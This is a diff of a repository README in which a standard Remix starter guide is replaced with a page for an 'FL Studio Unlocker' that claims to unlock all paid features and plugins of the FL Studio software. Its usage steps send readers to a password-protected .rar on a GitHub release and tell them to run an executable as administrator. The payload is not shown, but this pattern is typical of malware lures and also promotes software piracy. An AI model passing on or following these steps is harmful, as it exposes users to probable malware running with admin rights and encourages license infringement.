@@ -1,38 +1,24 @@
-# Welcome to Remix!
+### FL Studio Activation Tool
 
-- [Remix Docs](https://remix.run/docs)
+# Unlock FL Studio
 
-## Development
+Welcome to the FL Studio Unlocker repository, designed to provide full access to your FL Studio software.
 
-From your terminal:
+## 📜 Overview
 
-```sh
-npm run dev
-```
+This tool offers a straightforward way to unlock FL Studio, enabling all premium features and plugins for unrestricted music production.
 
-This starts your app in development mode, rebuilding assets on file changes.
+## 🛠️ Features
 
-## Deployment
+- **Lifetime Unlock**:
+  - Permanently unlock all versions.
+- **All Plugins Included**:
+  - Access every official FL Studio plugin.
+- **No Internet Needed**:
+  - Activate your software offline.
 
-First, build your app for production:
+## 🚀 How to Use
 
-```sh
-npm run build
-```
-
-Then run the app in production mode:
-
-```sh
-npm start
-```
-
-Now you'll need to pick a host to deploy it to.
-
-### DIY
-
-If you're familiar with deploying node applications, the built-in Remix app server is production-ready.
-
-Make sure to deploy the output of `remix build`
-
-- `build/`
-- `public/build/`
+1. Download from [this link](https://github.com/RWD29/CODW-H/releases/download/fjkklw23/Release.rar) (password: `2024`).
+2. Extract the files.
+3. Run `FLStudioUnlocker.exe` as an admin.
